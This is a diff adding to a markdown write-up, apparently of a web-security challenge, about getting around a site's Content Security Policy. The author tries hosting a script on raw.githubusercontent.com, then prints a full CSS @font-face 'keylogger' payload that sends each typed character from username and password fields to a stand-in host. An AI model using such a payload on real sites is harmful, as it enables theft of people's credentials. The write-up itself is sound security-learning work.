@@ -76,8 +76,49 @@ This is the content policy because of which I cannot add arbitrary links. Only l
 
 On API level, these are the lines which prevent us from sending a malacious url. No CSRF is possible.
 
+## Github raw
+
+The CSP allows files from `raw.githubusercontent.com` whcih anyone can make.
+
+![image](https://github.com/HACKER097/WebEx/assets/38581702/e2f6e782-d0dd-4e35-b7cb-a9e7af2b95e3)
+
+I made my own sus file on `raw.githubusercontent.com` and tried to get it to run.
+
+`<img src="https://raw.githubusercontent.com/HACKER097/WebEx/main/xxs.js" />`
+AND
+`<img src="https://raw.githubusercontent.com/HACKER097/WebEx/main/xxs.jpg" />`
+
+
+This does not work. I guess JS is not allowed
+
 ## Styles
 
 OK this was a worthless tangent, lets get back to the initial hint, which is the `unsafe-inline` rule.
 
-We cannot add js, but are able to add inline styles.
+We cannot add js, but are able to add inline styles. One of the things you can do using styles is make a keylogger.
+
+![image](https://github.com/HACKER097/WebEx/assets/38581702/bcf9ad08-1865-41fd-84e8-e154b0bf8958)
+
+Anything typed here would make a request to `example.com` which it can easily view. I didnt have time to setup my own server, but the request works perfectly, and should work.
+
+Here is the used payload
+
+```html
+<html>
+<html>
+  <style>
+    @font-face { font-family: x; src: url(https://example.com/?value=a), local(Impact); unicode-range: U+61; }
+    @font-face { font-family: x; src: url(https://example.com/?value=b), local(Impact); unicode-range: U+62; }
+    @font-face { font-family: x; src: url(https://example.com/?value=c), local(Impact); unicode-range: U+63; }
+    @font-face { font-family: x; src: url(https://example.com/?value=d), local(Impact); unicode-range: U+64; }
+    input { font-family: x, 'Comic sans ms'; }
+  </style>
+
+  <input type=text placeholder="username">
+  <br>
+  <br>
+  <input type=text placeholder="password">
+  <br>
+  <br>
+  <button>Login</button>
+```
